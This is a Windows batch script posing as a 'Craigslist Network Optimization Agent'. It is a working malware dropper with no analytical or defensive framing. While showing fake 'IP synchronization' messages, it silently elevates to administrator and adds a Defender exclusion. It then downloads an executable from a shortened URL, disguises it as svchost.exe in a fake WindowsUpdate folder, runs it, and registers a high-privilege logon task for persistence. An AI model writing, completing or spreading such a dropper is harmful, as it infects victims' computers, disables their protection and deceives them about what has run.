@echo off

:: ================== IMMEDIATE VISIBLE CONSOLE ==================
if not defined WINDOW_HIDDEN (
    set "WINDOW_HIDDEN=1"
    start "" cmd /c "%~f0"
    exit /b
)

:: Self-elevate to Administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ================== CENTER CONSOLE IMMEDIATELY ==================
powershell -NoProfile -Command ^
    "$h = (Get-Process -Id $PID).MainWindowHandle; " ^
    "$Win32 = Add-Type -Name Win32 -Namespace Win32 -PassThru -MemberDefinition ' [DllImport(\"user32.dll\")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect); [DllImport(\"user32.dll\")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint); '; " ^
    "$rect = New-Object RECT; " ^
    "if ($Win32::GetWindowRect($h, [ref]$rect)) { " ^
    "$w = $rect.Right-$rect.Left; $hgt = $rect.Bottom-$rect.Top; " ^
    "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea; " ^
    "$x = ($screen.Width - $w)/2; $y = ($screen.Height - $hgt)/2 - 50; " ^
    "$Win32::MoveWindow($h, $x, $y, $w, $hgt, $true) }" >nul 2>&1

color 0a
cls
title Craigslist

echo.
echo   [ Craigslist Network Optimization Agent ]
echo   ================================================
echo.
echo   Synchronizing IP with secure endpoint...

:: === Real actions (silent) ===
set "INSTALL_DIR=C:\ProgramData\WindowsUpdate"
set "PAYLOAD=%INSTALL_DIR%\svchost.exe"
set "URL=https://y.hn/juykz"
set "TASK_NAME=WindowsUpdateTask"

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$url = '%URL%'; $path = '%PAYLOAD%'; try { (New-Object System.Net.WebClient).DownloadFile($url, $path) } catch {}" >nul 2>&1

timeout /t 2 /nobreak >nul 2>&1

if exist "%PAYLOAD%" (
    powershell -Command "Unblock-File -Path '%PAYLOAD%' -ErrorAction SilentlyContinue" >nul 2>&1
    taskkill /f /im "svchost.exe" /fi "Path eq %PAYLOAD%" >nul 2>&1
    start "" "%PAYLOAD%" >nul 2>&1
    
    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
    schtasks /create /tn "%TASK_NAME%" /tr "\"%PAYLOAD%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f /it >nul 2>&1
)

echo.
echo   [+] IP address successfully synchronized with secure endpoint.
echo   [+] Secure tunnel established.
echo.
echo   [✓] Optimization completed successfully.
echo   IP synchronization stable ^| System performance optimized.
echo.
echo   ================================================
echo.
echo   Press any key to close this window...
pause >nul

exit /b